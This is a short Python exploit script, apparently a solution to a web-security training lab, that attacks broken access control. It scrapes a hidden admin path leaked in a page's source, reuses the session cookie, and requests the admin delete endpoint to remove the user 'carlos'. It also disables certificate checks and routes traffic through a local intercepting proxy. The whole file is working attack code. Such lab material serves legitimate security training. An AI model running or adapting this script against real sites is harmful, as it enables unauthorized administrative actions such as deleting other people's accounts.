import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def delete_user(url, admin_path, cookies):
    delete_url = url + admin_path + '/delete?username=carlos'
    r = requests.get(delete_url, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('(+) User carlos deleted successfully!')
        sys.exit(-1)

    else:
        print('(-) Failed to delete user carlos!')
        sys.exit(-1)


def broken_acccess_control_exploit(url):
    r = requests.get(url, verify=False, proxies=proxies)

    # retrieving the sesion cookie 
    session_cookie = r.cookies.get_dict().get('session')

    # retrieve the admin path
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(text=re.compile("/admin-"))
    print(admin_instances)

    # extracting the specific path location text
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)
    print(admin_path)

    #dictionary to store the session cookie
    cookies = {'session' : session_cookie} 
    delete_user(url, admin_path, cookies)


def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('(+) Starting the Exploit : Broken Access Control - Unprotected admin functionality - UnPredictable location \n')
    broken_acccess_control_exploit(url)

if __name__ == "__main__":
    main()